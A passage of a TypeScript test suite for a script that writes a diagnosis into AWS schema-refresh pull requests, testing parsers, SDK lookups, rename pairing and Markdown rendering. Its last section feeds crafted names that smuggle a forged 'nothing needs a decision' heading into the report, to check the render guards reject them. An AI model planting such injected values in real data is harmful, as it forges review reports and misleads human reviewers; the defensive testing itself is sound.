/**
 * The refresh pull request's own diagnosis — `scripts/diagnose-schema-refresh.mjs`.
 *
 * The job opens a PR that may be RED by design, and before this script the PR
 * said only that such a class exists: finding out which property, on which
 * type, declared where, meant reading two checkers' CI output. All of that is
 * mechanical, so it is computed and written into the PR.
 *
 * The suite is shaped by the two ways this script can be WORSE than saying
 * nothing, both of which it did during development against real drift:
 *
 * 1. **A confident wrong answer.** Looking a property name up across every
 *    provider made `AWS::CodeCommit::Repository.Id` report evidence from
 *    `@aws-sdk/client-cloudfront`, because that file sorted first. Lookups are
 *    now scoped to the provider that actually serves the type.
 * 2. **A silent empty.** The declared-property parse missed `new Set<string>([`
 *    and returned nothing, which filtered every removal away and rendered
 *    "nothing needs a decision" over a PR that did. That parse now refuses to
 *    return an empty map for a non-empty module.
 *
 * Both are pinned below, and the real-repo cases are anchored on the actual
 * `register-providers.ts` and the actual generated coverage module, because a
 * synthetic fixture for either would encode the same assumption the parser
 * makes.
 */
import { describe, it, expect } from 'vite-plus/test';
import { execFileSync, spawnSync } from 'node:child_process';
import { mkdtempSync, readFileSync, readdirSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import {
  comparePropertySets,
  findDeclarationCandidates,
  mapTypesToProviderFiles,
  parseDeclaredProperties,
  pairRenames,
  NESTED_KEY_FAILURE_RE,
  parseNestedKeyDivergences,
  renderDetail,
  renderKey,
  renderLiteral,
  buildSdkLag,
  CHECK_GUIDANCE,
  KNOWN_FLAGS,
  classifyGitShowFailure,
  assertFixtureFloor,
  collectFixtureDeltas,
  loadDeclaredProperties,
  UNREADABLE,
  clientsForType,
  sdkClientVersions,
  renderDiagnosis,
  renderName,
  sdkModelsMember,
  sdkVersionLag,
} from '../../../scripts/diagnose-schema-refresh.mjs';

const REPO_ROOT = join(dirname(fileURLToPath(import.meta.url)), '..', '..', '..');

const fixture = (properties: string[], readOnly: string[] = []) =>
  JSON.stringify({
    resourceType: 'AWS::Test::Type',
    generatedAt: '2026-01-01',
    properties,
    readOnlyProperties: readOnly,
  });

describe('comparePropertySets', () => {
  it('separates removals, additions, and the writable subset of additions', () => {
    // The writable split is the load-bearing one: a read-only addition can
    // never be a dropped value, because there was nothing to send.
    const delta = comparePropertySets(
      fixture(['Keep', 'Gone']),
      fixture(['Keep', 'NewWritable', 'NewReadOnly'], ['NewReadOnly'])
    );
    expect(delta.removed).toEqual(['Gone']);
    expect(delta.added).toEqual(['NewWritable', 'NewReadOnly']);
    expect(delta.writableAdded).toEqual(['NewWritable']);
  });

  it('reports nothing for an unchanged type', () => {
    const delta = comparePropertySets(fixture(['A']), fixture(['A']));
    expect(delta).toEqual({ removed: [], added: [], writableAdded: [] });
  });
});

describe('parseNestedKeyDivergences', () => {
  it('captures the finding line FIELD BY FIELD, not as one opaque string', () => {
    // `nestedKey` reaches Markdown, and it comes from the un-checksummable
    // bundle by way of the fixtures — so it has to arrive as its own field for
    // the render guard to have anything to guard.
    const { divergences, unparsedFailure } = parseNestedKeyDivergences(
      [
        'nested-key-coverage: FAILED',
        '  AWS::Glue::Connection: OAuth2Credentials [definition-member-missing] (SDK interface `OAuth2Properties` has no member)',
        '  AWS::ECS::Service: someKey [case-divergence] (SDK models `SomeKey`)',
        'some unrelated trailing line',
      ].join('\n')
    );
    expect(unparsedFailure).toBe(false);
    expect(divergences).toHaveLength(2);
    expect(divergences[0]!.resourceType).toBe('AWS::Glue::Connection');
    expect(divergences[0]!.nestedKey).toBe('OAuth2Credentials');
    expect(divergences[0]!.bucket).toBe('definition-member-missing');
    expect(divergences[0]!.detail).toContain('has no member');
    expect(divergences[1]!.bucket).toBe('case-divergence');
    expect(divergences[1]!.nestedKey).toBe('someKey');
  });

  it('returns nothing, and no failure flag, for output with no findings', () => {
    expect(parseNestedKeyDivergences('nested-key-coverage: OK — 0 divergences')).toEqual({
      divergences: [],
      unparsedFailure: false,
    });
  });

  it('FLAGS a failure it could not read, in every mode the checker announces one', () => {
    // The checker's four FAIL verdicts and its crash path all legitimately
    // print no finding line this parser recognises. Throwing on them discarded
    // the whole diagnosis; returning a bare `[]` rendered "additions only" over
    // a red check. Both were shipped; the flag is the third answer.
    for (const failing of [
      'nested-key-coverage: FAIL — nested CFn->SDK key divergence(s) detected.',
      'nested-key-coverage: FAIL — stale NESTED_KEY_ALLOW_LIST entr(ies) match no audited key',
      'nested-key-coverage: FAIL — stale segmentRenames entr(ies) no longer resolve anything',
      'nested-key-coverage: FAIL — stale terminalRenames entr(ies): the un-renamed terminal',
      'nested-key-coverage: failed — Cannot find module',
    ]) {
      const out = parseNestedKeyDivergences(failing);
      expect(out.divergences).toEqual([]);
      expect(out.unparsedFailure, `did not flag: ${failing}`).toBe(true);
    }
  });

  it('flags a PARTIAL parse, not only a total one', () => {
    // The same correction `parseDeclaredProperties` needed one round earlier,
    // in the sibling parser: gated on `length === 0`, a producer change
    // touching SOME lines dropped them and the report rendered the survivors
    // with no warning. Two of these five parse strictly; three do not.
    const out = parseNestedKeyDivergences(
      [
        'nested-key-coverage: FAIL — nested CFn->SDK key divergence(s) detected.',
        '  AWS::ECS::Service: someKey [case-divergence]',
        '  AWS::Glue::Connection: OAuth2Props [no-sdk-member]',
        '  AWS::S3::Bucket: a key with spaces [no-sdk-member]',
        '  AWS::S3::Bucket: Some.Key [newBucket]',
        '  AWS::S3::Bucket: Other.Key [no-sdk-member] (detail).',
      ].join('\n')
    );
    expect(out.divergences.length).toBe(2);
    expect(out.unparsedFailure, 'three findings were dropped silently').toBe(true);
  });

  it('flags a checker that failed with NO announcement at all, via its exit code', () => {
    // An empty log, a `task not found` and an OOM kill carry nothing to grep
    // for, and all three rendered "additions only" over a checker that never
    // ran. The status is the other half of the question.
    for (const output of ['', 'error: task "audit:nested-key-coverage:check" not found\n']) {
      expect(parseNestedKeyDivergences(output, 1).unparsedFailure, `rc=1: ${output}`).toBe(true);
      expect(parseNestedKeyDivergences(output, 0).unparsedFailure, `rc=0: ${output}`).toBe(false);
    }
  });

  it('does not flag a failure when it DID read findings out of one', () => {
    const out = parseNestedKeyDivergences(
      'nested-key-coverage: FAIL — nested CFn->SDK key divergence(s) detected.\n' +
        '  AWS::ECS::Service: someKey [case-divergence]\n'
    );
    expect(out.divergences).toHaveLength(1);
    expect(out.unparsedFailure).toBe(false);
  });

  it('pins its failure pattern against the checker that produces the text', () => {
    // Nothing else joins the two files. A reword in `gen-nested-key-coverage.ts`
    // would make the pattern inert, and an inert pattern renders a failing
    // check as "additions only" — the silent-clean verdict this job exists to
    // prevent.
    const producer = readFileSync(
      join(REPO_ROOT, 'scripts/gen-nested-key-coverage.ts'),
      'utf8'
    );
    const announcements = [...producer.matchAll(/nested-key-coverage: (?:FAIL|failed)/g)].map(
      (m) => m[0]
    );
    expect(announcements.length, 'the checker no longer announces failure this way').toBeGreaterThanOrEqual(5);
    for (const announcement of new Set(announcements)) {
      expect(NESTED_KEY_FAILURE_RE.test(announcement), `unmatched: ${announcement}`).toBe(true);
    }
  });
});

describe('parseDeclaredProperties', () => {
  const REAL_GENERATED = join(REPO_ROOT, 'src/provisioning/property-coverage.generated.ts');

  it('reads the REAL generated module, including its `new Set<string>([` shape', () => {
    // Anchored on the real module: a synthetic sample would be written to match
    // whatever the parser expects, which is exactly how the `<string>` type
    // argument was missed.
    const declared = parseDeclaredProperties(readFileSync(REAL_GENERATED, 'utf8'));
    // Compared against the module's OWN entry count, not a floor. A floor of
    // 100 was blind to the real defect: 131 of 134 parsed, three types silently
    // absent and two credited with a NEIGHBOUR's properties, because a type
    // whose set is `new Set<string>()` has no `[` for the lazy match to stop at.
    const entryCount = (readFileSync(REAL_GENERATED, 'utf8').match(/\[\s*'AWS::[\w:]+',\s*\{/g) ?? [])
      .length;
    expect(entryCount).toBeGreaterThan(100);
    expect(declared.size).toBe(entryCount);
    // The two types the partial parse mis-credited, pinned by name.
    expect(declared.get('AWS::CloudFormation::WaitConditionHandle')!.size).toBe(0);
    expect(declared.get('AWS::BedrockAgentCore::Evaluator')!.has('EvaluatorConfig')).toBe(true);
    const route53 = declared.get('AWS::Route53::RecordSet');
    expect(route53, 'AWS::Route53::RecordSet left the generated table').toBeDefined();
    expect(route53!.has('AliasTarget')).toBe(true);
  });

  it('REFUSES a non-empty module it parsed nothing from', () => {
    // The failure that shipped for one revision. An empty map here filters
    // every removal away and renders "nothing needs a decision" over a PR that
    // does — worse than crashing, because it reads as a clean report.
    expect(() => parseDeclaredProperties('export const X = 1;\n')).toThrow(
      /parsed to zero types/
    );
  });

  it('REFUSES a module whose declaration shape it no longer recognises', () => {
    // The guard that shipped compared `declared.size` against `boundaries.length`,
    // and `declared.set` runs once per boundary — so it could only ever fire on
    // a DUPLICATE type name. Measured against the real module: renaming the
    // member emptied all 134 sets with no refusal at all, which filters every
    // removal away and renders "nothing needs a decision" over a red check.
    const mutated = readFileSync(REAL_GENERATED, 'utf8').replaceAll('handled:', 'handledProps:');
    expect(() => parseDeclaredProperties(mutated)).toThrow(/recognised the declaration shape/);
  });

  it('REFUSES a PARTIAL shortfall, not only a total collapse', () => {
    // The motivating measurement was partial — 131 of 134 parsed, three
    // swallowed and two credited with a neighbour's properties — and a guard
    // reading `recognised === 0` covers none of that while passing the
    // total-collapse case above. One entry is enough to refuse.
    const real = readFileSync(REAL_GENERATED, 'utf8');
    // Inside an ENTRY, not the first occurrence in the file: the module has 135
    // `handled:` occurrences and 134 entries, because the type declaration
    // carries one too. Renaming that one changes no entry, and this case failed
    // green-side until it did — the same off-by-one the parser itself has to
    // get right.
    const firstEntry = real.search(/\[\s*'AWS::[\w:]+',\s*\{/);
    expect(firstEntry, 'no type entry found').toBeGreaterThan(-1);
    const at = real.indexOf('handled:', firstEntry);
    expect(at, 'the generated module no longer uses this shape').toBeGreaterThan(-1);
    const mutated = real.slice(0, at) + 'handledProps:' + real.slice(at + 'handled:'.length);
    // Still overwhelmingly parseable — this is not a collapse.
    expect(parseDeclaredProperties(real).size).toBeGreaterThan(100);
    expect(() => parseDeclaredProperties(mutated)).toThrow(/recognised the declaration shape/);
  });

  it('accepts a type declaring NOTHING, which is not the same as an unread one', () => {
    // `new Set<string>()` has no `[`, so it matches neither the populated shape
    // nor a naive "did we extract names" test. Counting it as unrecognised
    // would refuse the real module outright.
    const declared = parseDeclaredProperties(readFileSync(REAL_GENERATED, 'utf8'));
    const empties = [...declared.values()].filter((set) => set.size === 0).length;
    expect(empties, 'no empty-set entry left — this case no longer covers that shape').toBeGreaterThan(0);
  });

  it('REFUSES a MISSING module rather than reading it as an empty one', () => {
    // `parseDeclaredProperties('')` legitimately returns an empty map, so the
    // caller's absent-file-to-`''` conversion made a missing module mean "no
    // provider declares anything" — which filters every removal away and
    // renders the clean verdict.
    const dir = mkdtempSync(join(tmpdir(), 'cdkd-noroot-'));
    try {
      expect(() => loadDeclaredProperties(dir)).toThrow(/is missing/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it('loads the real module through the same path main() uses', () => {
    // Otherwise the refusal above is the only thing exercised, and a broken
    // read would look like a passing refusal test.
    expect(loadDeclaredProperties().size).toBeGreaterThan(100);
  });

  it('returns an empty map for genuinely empty input, without throwing', () => {
    expect(parseDeclaredProperties('').size).toBe(0);
  });
});

describe('mapTypesToProviderFiles', () => {
  const REAL_REGISTER = join(REPO_ROOT, 'src/provisioning/register-providers.ts');

  it('resolves both registration shapes against the REAL registration file', () => {
    const map = mapTypesToProviderFiles(readFileSync(REAL_REGISTER, 'utf8'));
    expect(map.size).toBeGreaterThan(100);
    // Registered from a shared local (`const route53Provider = new Route53Provider()`).
    expect(map.get('AWS::Route53::RecordSet')).toBe(
      'src/provisioning/providers/route53-provider.ts'
    );
    // Registered with a fresh instance inline.
    expect(map.get('AWS::CodeCommit::Repository')).toBe(
      'src/provisioning/providers/codecommit-repository-provider.ts'
    );
  });

  it('returns nothing for a source with no registrations', () => {
    expect(mapTypesToProviderFiles('export function registerAllProviders() {}').size).toBe(0);
  });
});

describe('findDeclarationCandidates', () => {
  it('is scoped to the provider serving the type, not the whole directory', () => {
    // The confident-wrong-answer case. Unscoped, `Id` matched 50+ lines across
    // 20 providers; scoped, it can only report the file that owns the type.
    // `AliasTarget`, not `GeoProximityLocation`: the latter is the property this
    // very refresh cycle removes, so following the runbook's own remedy would
    // red this test with a message about the diagnosis script rather than about
    // the classification.
    const hits = findDeclarationCandidates(
      'AliasTarget',
      'src/provisioning/providers/route53-provider.ts',
      'AWS::Route53::RecordSet',
      REPO_ROOT
    );
    expect(hits.length).toBeGreaterThan(0);
    for (const hit of hits) {
      expect(hit.startsWith('src/provisioning/providers/route53-provider.ts:')).toBe(true);
    }
  });

  it('returns nothing rather than guessing when the owning provider is unknown', () => {
    expect(findDeclarationCandidates('Whatever', undefined, undefined, REPO_ROOT)).toEqual([]);
  });

  it('scopes to the TYPE block inside a provider file serving several types', () => {
    // 17 provider files serve more than one type; `ec2-provider.ts` serves 15.
    // Unscoped, asking about `Tags` on one Glue type returned every `'Tags'` in
    // the file, including other Glue types' declarations.
    // The PROPERTY is what makes this discriminate, and two rounds picked one
    // that could not. `ConnectionInput` occurs only inside this type's own
    // block, so scoped, unscoped and file-wide were the same answer and BOTH
    // window bounds could be deleted with every case still green (measured).
    // `Name` occurs before the block, inside it, and after it, so deleting the
    // START bound and deleting the END bound each fail a different assertion
    // below.
    const type = 'AWS::Glue::Connection';
    const file = 'src/provisioning/providers/glue-provider.ts';
    const scoped = findDeclarationCandidates('Name', file, type, REPO_ROOT);
    const unscoped = findDeclarationCandidates('Name', file, undefined, REPO_ROOT);
    expect(scoped.length, 'the type block yielded nothing — scoping window is wrong').toBeGreaterThan(0);
    // Strictly wider, not merely no narrower: an equal count means the property
    // is confined to the block and the case cannot see a missing bound at all.
    expect(
      unscoped.length,
      'unscoped == scoped — this property cannot discriminate; pick one that occurs outside the block'
    ).toBeGreaterThan(scoped.length);
    // Every scoped hit must sit inside the block, i.e. at or after the type's
    // own literal — deleting the window's END makes this fail on a later type.
    const lines = readFileSync(join(REPO_ROOT, file), 'utf8').split('\n');
    const start = lines.findIndex((l) => l.includes(`'${type}'`));
    const nextType = lines.findIndex(
      (l, i) => i > start && /'AWS::[A-Za-z0-9]+::[A-Za-z0-9]+'/.test(l)
    );
    for (const hit of scoped) {
      const lineNo = Number(hit.split(':')[1]);
      expect(lineNo).toBeGreaterThan(start);
      if (nextType !== -1) expect(lineNo).toBeLessThanOrEqual(nextType);
    }
  });
});

describe('sdkModelsMember', () => {
  it('consults the client the OWNING provider imports', () => {
    const evidence = sdkModelsMember(
      'AliasTarget',
      'src/provisioning/providers/route53-provider.ts',
      REPO_ROOT
    );
    expect(evidence, 'no SDK client resolved for the Route53 provider').toBeDefined();
    // The whole point of deriving the client from the provider's own imports:
    // CFn spells it `Route53`, the SDK spells it `route-53`, and no
    // hand-maintained table is involved.
    expect(evidence!.client).toBe('@aws-sdk/client-route-53');
    expect(evidence!.modelled).toBe(true);
  });

  it('reports NOT modelled for a name no client carries', () => {
    const evidence = sdkModelsMember(
      'CdkdDefinitelyNotAnSdkMemberName',
      'src/provisioning/providers/route53-provider.ts',
      REPO_ROOT
    );
    expect(evidence!.modelled).toBe(false);
  });

  it('is CASE-INSENSITIVE — the defect that leaned toward deleting a live declaration', () => {
    // A real-repo anchor, not a synthetic one: `@aws-sdk/client-api-gateway`
    // spells the member `restApiId` and carries no PascalCase spelling anywhere
    // in its models. Case-sensitively, `RestApiId` came back `modelled: false`,
    // and the report then said both of AWS's descriptions had dropped it —
    // encouraging deletion of a property the API very much still takes.
    const evidence = sdkModelsMember(
      'RestApiId',
      'src/provisioning/providers/apigateway-provider.ts',
      REPO_ROOT
    );
    expect(evidence, 'no SDK client resolved for the API Gateway provider').toBeDefined();
    expect(evidence!.modelled).toBe(true);
  });

  it('consults EVERY imported client, not just the first', () => {
    // 14 provider files import 2-4 clients. Reading the first is only
    // coincidentally right today, and an import reformat would flip the
    // evidence to the wrong service silently — the first defect returning
    // through a side door.
    // A name present in NO client, so the scan cannot stop at the first —
    // `consulted` then records everything it actually looked at.
    const evidence = sdkModelsMember(
      'CdkdNoSuchMemberAnywhere',
      'src/provisioning/providers/lambda-function-provider.ts',
      REPO_ROOT
    );
    expect(evidence!.modelled).toBe(false);
    expect(evidence!.consulted!.length).toBeGreaterThan(1);
  });

  it('refuses a property name it would have to rewrite to search for', () => {
    // Scrubbing non-alphanumerics turns the needle into a different question.
    expect(
      sdkModelsMember('Foo.Bar', 'src/provisioning/providers/route53-provider.ts', REPO_ROOT)
    ).toBeUndefined();
  });

  it('answers undefined rather than guessing when the provider is unknown', () => {
    expect(sdkModelsMember('X', undefined, REPO_ROOT)).toBeUndefined();
  });
});

describe('sdkVersionLag', () => {
  it('settles the lag question in both directions', () => {
    // The one branch of the divergence decision that IS decidable: current
    // means the lag reading is eliminated, not merely unlikely.
    expect(sdkVersionLag('x', '3.1.0', () => '3.9.0\n')).toEqual({
      installed: '3.1.0',
      latest: '3.9.0',
      behind: true,
    });
    expect(sdkVersionLag('x', '3.9.0', () => '3.9.0\n')!.behind).toBe(false);
  });

  it('degrades to silence on a network failure or junk answer', () => {
    // A diagnosis must never fail the job it describes.
    expect(
      sdkVersionLag('x', '3.1.0', () => {
        throw new Error('offline');
      })
    ).toBeUndefined();
    expect(sdkVersionLag('x', '3.1.0', () => 'npm ERR! 404')).toBeUndefined();
    expect(sdkVersionLag('x', undefined, () => '3.9.0')).toBeUndefined();
  });
});

describe('pairRenames', () => {
  /**
   * The PAIRING is tested, not the renderer's reaction to a hand-fed result.
   * The earlier case passed `renameCandidates: []` into `renderDiagnosis` and
   * asserted no rename appeared — trivially true, and it left the actual rule
   * unpinned: reverting it to "every writable addition is a rename" kept all 37
   * cases green.
   */
  it('pairs a removal with a similarly-named addition', () => {
    expect(pairRenames('Id', ['RepositoryId'])).toEqual(['RepositoryId']);
    expect(pairRenames('GeoProximityLocation', ['GeoProximityLocationV2'])).toEqual([
      'GeoProximityLocationV2',
    ]);
  });

  it('refuses an empty name rather than pairing it with everything', () => {
    // `''.endsWith('')` is true, so an empty needle matched every addition and
    // would have claimed each one a rename of a nameless property.
    expect(pairRenames('', ['Alpha', 'Beta'])).toEqual([]);
  });

  it('does NOT pair an unrelated addition', () => {
    // The surviving mutation the old test could not see: unconditional pairing
    // told the maintainer that `Tags` and `Name` were `Id` renamed.
    expect(pairRenames('Id', ['Tags', 'Name', 'CapacityProviderConfiguration'])).toEqual([]);
  });

  it('is PREFIX/SUFFIX, not containment — the rule the rename signal rests on', () => {
    // `CapacityProviderConfiguration` above cannot discriminate: it justifies
    // itself with "`Id` is inside Prov-id-er", true only case-INsensitively,
    // while `pairRenames` is case-sensitive — so reverting the rule to
    // `includes()` left all 118 cases green. `ProviderIdentity` CONTAINS `Id`
    // and neither starts nor ends with it, so it separates the two rules.
    expect(
      'CapacityProviderConfiguration'.includes('Id'),
      'the old anchor still cannot discriminate'
    ).toBe(false);
    expect('ProviderIdentity'.includes('Id'), 'this anchor no longer contains the needle').toBe(
      true
    );
    expect(pairRenames('Id', ['ProviderIdentity'])).toEqual([]);
    // The accepted twin, so a rule that pairs NOTHING also fails.
    expect(pairRenames('Id', ['RepositoryId', 'IdArn'])).toEqual(['RepositoryId', 'IdArn']);
  });

  it('pairs nothing when the refresh added nothing writable', () => {
    // Read-only additions never reach here — a declaration cannot target one.
    expect(pairRenames('Id', [])).toEqual([]);
  });
});

describe('renderName', () => {
  it('rejects a name carrying Markdown rather than rendering it', () => {
    // Property names come from an artifact this job documents as
    // TLS-trusted-only. A crafted key can close the backtick span and forge a
    // "nothing needs a decision" heading in the PR body and the umbrella issue
    // comment — attacking the human-review half of that accepted residual.
    expect(renderName('WarmUpConfiguration')).toBe('`WarmUpConfiguration`');
    const poisoned = renderName('Foo`\n\n## Nothing in this refresh needs a decision');
    expect(poisoned).not.toContain('##');
    expect(poisoned).toContain('rejected');
  });
});

describe('renderDiagnosis', () => {
  const removedEntry = {
    resourceType: 'AWS::Route53::RecordSet',
    properties: ['GeoProximityLocation'],
    candidates: { GeoProximityLocation: ['src/provisioning/providers/route53-provider.ts:274'] },
    sdk: {
      GeoProximityLocation: {
        client: '@aws-sdk/client-route-53',
        modelled: true,
        version: '3.1018.0',
      },
    },
  };

  it('names the property, the site, and which way the SDK evidence leans', () => {
    const md = renderDiagnosis({
      removed: [removedEntry],
      writableAdded: [],
      divergences: [],
      skipped: [],
    });
    expect(md).toContain('GeoProximityLocation');
    expect(md).toContain('route53-provider.ts:274');
    expect(md).toContain('@aws-sdk/client-route-53');
    expect(md).toContain('still models this name');
    expect(md).toContain('bogusTolerated');
    expect(md).toContain('3.1018.0');
  });

  it('leans the other way — and warns about renames — when the SDK dropped it too', () => {
    const md = renderDiagnosis({
      removed: [
        {
          ...removedEntry,
          sdk: { GeoProximityLocation: { client: '@aws-sdk/client-route-53', modelled: false } },
        },
      ],
      writableAdded: [],
      divergences: [],
      skipped: [],
    });
    expect(md).toContain('no longer models this name');
    expect(md).toContain('retiring the declaration');
    // A rename is indistinguishable here, and saying so is what keeps the
    // evidence from reading as a verdict.
    expect(md).toContain('rename would look identical');
  });

  it('says so plainly when no evidence could be gathered', () => {
    const md = renderDiagnosis({
      removed: [{ ...removedEntry, sdk: { GeoProximityLocation: undefined } }],
      writableAdded: [],
      divergences: [],
      skipped: [],
    });
    expect(md).toContain('SDK evidence: none');
  });

  it('flags a RENAME when the same refresh added a name to the same type', () => {
    // The single most decisive signal available, and it was missed at first:
    // a rename is a removal and an addition arriving TOGETHER, and both sides
    // are in hand. Measured on real drift, `AWS::CodeCommit::Repository`
    // dropped `Id` and gained `RepositoryId` in one cycle.
    const md = renderDiagnosis({
      removed: [
        {
          resourceType: 'AWS::CodeCommit::Repository',
          properties: ['Id'],
          candidates: { Id: ['src/provisioning/providers/codecommit-repository-provider.ts:10'] },
          sdk: { Id: { client: '@aws-sdk/client-codecommit', modelled: false, version: '3.0.0' } },
          renameCandidates: { Id: ['RepositoryId'] },
        },
      ],
      writableAdded: [
        { resourceType: 'AWS::CodeCommit::Repository', properties: ['RepositoryId'] },
      ],
      divergences: [],
      skipped: [],
    });
    expect(md).toContain('Possibly a RENAME');
    expect(md).toContain('RepositoryId');
  });

  it('does NOT call a READ-ONLY addition a rename, whatever the caller passed', () => {
    // A declaration cannot be pointed at a read-only property, so this advice
    // cannot be followed. The caller filters to writable additions and that
    // filter had NO pin: swapping its argument for the unfiltered list left
    // every case green. Re-checked in the renderer, where both sides are in
    // hand, the class is closed whatever the caller passes.
    const md = renderDiagnosis({
      removed: [
        {
          resourceType: 'AWS::CodeCommit::Repository',
          properties: ['Id'],
          candidates: { Id: ['src/provisioning/providers/codecommit-repository-provider.ts:10'] },
          renameCandidates: { Id: ['RepositoryId'] },
        },
      ],
      // `RepositoryId` arrived READ-ONLY: absent from writableAdded entirely.
      writableAdded: [],
      divergences: [],
      skipped: [],
    });
    expect(md).not.toContain('Possibly a RENAME');
    expect(md).not.toContain('RepositoryId');
  });

  it('does NOT claim a rename when the refresh added nothing to that type', () => {
    const md = renderDiagnosis({
      removed: [{ ...removedEntry, renameCandidates: { GeoProximityLocation: [] } }],
      writableAdded: [],
      divergences: [],
      skipped: [],
    });
    expect(md).not.toContain('a RENAME');
  });

  it('carries the installed SDK version, since "not modelled" is only as current as it', () => {
    const md = renderDiagnosis({
      removed: [removedEntry],
      writableAdded: [],
      divergences: [],
      skipped: [],
    });
    expect(md).toContain('3.1018.0');
  });

  it('gives paste-able steps for BOTH classes, not just a classification', () => {
    // A report that classifies without saying what to run has handed over a
    // question, not the work.
    const md = renderDiagnosis({
      removed: [removedEntry],
      writableAdded: [],
      divergences: [
        { resourceType: 'AWS::Glue::Connection', nestedKey: 'SomeKey', bucket: 'definition-member-missing', detail: '' },
      ],
      skipped: [],
    });
    expect(md).toContain('aws cloudformation describe-type');
    expect(md).toContain('vp test run property-coverage');
    // The SDK-lag check is the step that answers the one question the evidence
    // cannot; without it an allow-list entry can be added over a stale SDK.
    expect(md).toContain('npm view @aws-sdk/client-');
    expect(md).toContain('audit:nested-key-coverage:check');
  });

  it('says the lag reading is RULED OUT when the client is current', () => {
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      divergences: [
        { resourceType: 'AWS::Glue::Connection', nestedKey: 'SomeKey', bucket: 'no-sdk-member', detail: '' },
      ],
      skipped: [],
      sdkLag: [
        {
          client: '@aws-sdk/client-glue',
          resourceType: 'AWS::Glue::Connection',
          installed: '3.9.0',
          latest: '3.9.0',
          behind: false,
          matched: true,
        },
      ],
    });
    expect(md).toContain('is current');
    expect(md).toContain('ruled out');
  });

  it('says the lag reading is LIVE, without claiming a bump would fix it', () => {
    // "Bumping would fix this" is not answerable by a name lookup — measured:
    // the live Glue divergence names ARE present in both the installed and the
    // latest client, because the checker's finding is interface-level.
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      divergences: [
        { resourceType: 'AWS::Glue::Connection', nestedKey: 'SomeKey', bucket: 'no-sdk-member', detail: '' },
      ],
      skipped: [],
      sdkLag: [
        {
          client: '@aws-sdk/client-glue',
          resourceType: 'AWS::Glue::Connection',
          installed: '3.1018.0',
          latest: '3.1127.0',
          behind: true,
          matched: true,
        },
      ],
    });
    expect(md).toContain('3.1018.0');
    expect(md).toContain('3.1127.0');
    expect(md).toContain('LIVE');
    expect(md).not.toContain('would fix');
  });

  it('omits the SDK-lag step when every divergence is a case-divergence', () => {
    // There is no judgement in a case divergence — the SDK has the key under a
    // different capitalisation — so the lag question does not arise.
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      divergences: [
        { resourceType: 'AWS::ECS::Service', nestedKey: 'SomeKey', bucket: 'case-divergence', detail: '' },
      ],
      skipped: [],
    });
    expect(md).toContain('case-divergence` means the SDK models the key');
    expect(md).not.toContain('npm view');
  });

  it('names read-only additions as needing nothing, since the diff still shows them', () => {
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      readOnlyAddedCount: 6,
      divergences: [],
      skipped: [],
    });
    expect(md).toContain('Read-only properties AWS added (6)');
    expect(md).toContain('nothing to do');
  });

  it('reports an additions-only cycle as needing no decision', () => {
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [{ resourceType: 'AWS::CloudWatch::Alarm', properties: ['WarmUpConfiguration'] }],
      divergences: [],
      skipped: [],
    });
    expect(md).toContain('Nothing in this refresh needs a decision');
    expect(md).toContain('WarmUpConfiguration');
    expect(md).toContain('no decision needed');
  });

  it('always closes by saying the decision is deliberately not made', () => {
    // Without this the report reads as a recommendation, which is exactly the
    // reading the asymmetry argument exists to prevent.
    for (const input of [
      { removed: [removedEntry], writableAdded: [], divergences: [], skipped: [] },
      { removed: [], writableAdded: [], divergences: [], skipped: [] },
    ]) {
      expect(renderDiagnosis(input)).toContain('deliberately not made here');
    }
  });

  it('renders every divergence field, and names both options', () => {
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      divergences: [
        {
          resourceType: 'AWS::Glue::Connection',
          nestedKey: 'OAuth2Properties.OAuth2Credentials',
          bucket: 'definition-member-missing',
          detail: 'SDK interface `OAuth2Properties` has no member',
        },
      ],
      skipped: [],
    });
    expect(md).toContain('AWS::Glue::Connection');
    expect(md).toContain('OAuth2Properties.OAuth2Credentials');
    expect(md).toContain('definition-member-missing');
    // The detail survives, minus the characters that could end the line early.
    expect(md).toContain('has no member');
    expect(md).toContain('NESTED_KEY_ALLOW_LIST');
    expect(md).toContain('installed');
  });

  it('lists types the public bundle does not carry', () => {
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      divergences: [],
      skipped: ['AWS::BedrockAgentCore::Browser'],
    });
    expect(md).toContain('AWS::BedrockAgentCore::Browser');
    expect(md).toContain('Not refreshed');
  });
});

describe('the render guards, at every site that reaches Markdown', () => {
  // The guard existed and was enforced at ONE of five call sites: reverting the
  // other four to raw interpolation left every case green. This drives one
  // diagnosis carrying a hostile name in EVERY name-bearing position and counts
  // the rejections, so a reverted site is a failing count rather than a case
  // nobody wrote.
  const POISON = 'Foo`\n\n## Nothing in this refresh needs a decision';
  // `resourceType` reaches Markdown in four more places, and main() takes it
  // verbatim from the fixture the bundle wrote.
  const POISON_TYPE = 'AWS::X::Y`\n\n## Nothing in this refresh needs a decision';

  it('rejects a hostile name in every position a bundle-derived name reaches', () => {
    const md = renderDiagnosis({
      removed: [
        {
          resourceType: POISON_TYPE,
          properties: [POISON],
          candidates: { [POISON]: [] },
          renameCandidates: { [POISON]: [POISON] },
          providerPath: 'src/provisioning/providers/glue-provider.ts',
        },
      ],
      writableAdded: [{ resourceType: POISON_TYPE, properties: [POISON] }],
      divergences: [
        {
          resourceType: POISON_TYPE,
          nestedKey: POISON,
          bucket: 'no-sdk-member',
          // Non-empty: an empty detail short-circuits the ternary, so the
          // `renderDetail` CALL SITE could be reverted with the count intact.
          detail: 'SDK has `X`',
        },
      ],
      // The unreadable section renders a name too, and adding a render site the
      // poison input cannot reach defeats this case's stated job.
      unreadable: ['AWS-X-Y`\n\n## Nothing in this refresh needs a decision.json'],
      // The failed-check HEADING is a twelfth site; without an entry here it
      // was pinned only against the wrong-guard swap, not against no guard.
      failedChecks: [POISON_TYPE],
      skipped: [POISON],
      sdkLag: [
        {
          resourceType: POISON_TYPE,
          client: '@aws-sdk/client-glue',
          installed: '3.0.0',
          latest: '3.1.0',
          behind: true,
          matched: true,
        },
        {
          // The RULED-OUT arm, which is the ordinary case — an installed client
          // that is current. It renders its own `resourceType`, and with only
          // the `behind: true` row here that interpolation could be reverted to
          // raw with nothing noticing. Two arms, two poisoned rows.
